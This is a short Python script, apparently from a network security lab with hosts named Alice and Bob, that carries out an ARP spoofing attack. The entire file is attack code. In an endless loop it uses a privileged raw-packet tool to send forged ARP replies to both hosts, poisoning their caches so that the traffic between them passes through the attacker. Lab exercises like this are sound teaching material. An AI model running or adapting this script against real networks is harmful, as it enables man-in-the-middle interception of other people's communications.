import subprocess
import time
from datetime import datetime

# Network settings
alice_mac = "02:42:0a:0a:0a:02"
bob_mac = "02:42:0a:0a:0a:03"
network_interface = "eth1"
protocol = "0x0806"
wait_time = 7

def send_packet(mac_addr, packet_file, msg):
    """Send ARP packet"""
    now = datetime.now().strftime("%H:%M:%S")
    print(f"[{now}] {msg} (MAC: {mac_addr})")
    subprocess.run(["sudo", "raw_packet", network_interface, mac_addr, protocol, packet_file], check=True)

# Start
print("--- ARP Spoofing Started ---")

while True:
    # Send to alice
    send_packet(alice_mac, "bobtoalice.bin", "Sending to Alice")
    # Send to bob
    send_packet(bob_mac, "alicetobob.bin", "Sending to Bob")
    time.sleep(wait_time)
